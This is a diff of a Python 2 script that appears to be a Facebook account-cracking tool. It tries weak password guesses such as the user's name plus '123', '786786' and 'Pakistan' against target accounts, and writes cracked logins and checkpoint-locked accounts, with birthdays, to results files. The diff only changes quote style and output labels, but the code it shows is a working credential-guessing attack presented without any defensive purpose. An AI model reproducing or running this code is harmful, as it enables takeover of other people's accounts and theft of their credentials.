@@ -283,15 +283,15 @@ def public():
 					pwx.append(ss+"123")
 					pwx.append(ss+"1234")
 					pwx.append(ss+"12345")
-					pwx.append("786786")
-					pwx.append("Pakistan")
-					pwx.append("000786")
+					pwx.append('786786')
+					pwx.append('Pakistan')
+					pwx.append('000786')
 				else:
 					pwx.append(ss+"123")
 					pwx.append(ss+"12345")
-					pwx.append("786786")
-					pwx.append("Pakistan")
-					pwx.append("000786")
+					pwx.append('786786')
+					pwx.append('Pakistan')
+					pwx.append('000786')
 					
 		try:
 			for pw in pwx:
@@ -302,7 +302,7 @@ def public():
 					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
 					ok.append(uid+'|'+pw)
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
+					save.write('  [FK-OK] '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -313,7 +313,7 @@ def public():
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
+						print('\r  \033[0;93m[FK-CP] ' +uid+ '|' + pw + '|' + ttl)
 						cp.append(uid+'|'+pw+'|'+ttl)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
@@ -322,7 +322,7 @@ def public():
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;93m[FK-CP] ' +uid+ '|' + pw + '       ')
 					cp.append(uid+'|'+pw)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
@@ -645,3 +645,5 @@ if __name__ == '__main__':
 		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 Run.py")
 	os.system("git pull")
 	login()
+
+
